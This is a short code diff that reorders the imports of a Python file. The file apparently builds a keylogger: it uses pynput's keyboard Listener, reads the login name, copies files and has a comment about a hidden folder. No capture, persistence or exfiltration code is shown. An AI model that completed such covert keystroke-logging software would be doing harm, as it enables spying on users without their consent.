@@ -1,8 +1,8 @@
-from pynput.keyboard import Listener
-
-import os
 import logging
+import os
 from shutil import copyfile
+
+from pynput.keyboard import Listener
 
 username = os.getlogin()
 # Moved to hidden folder
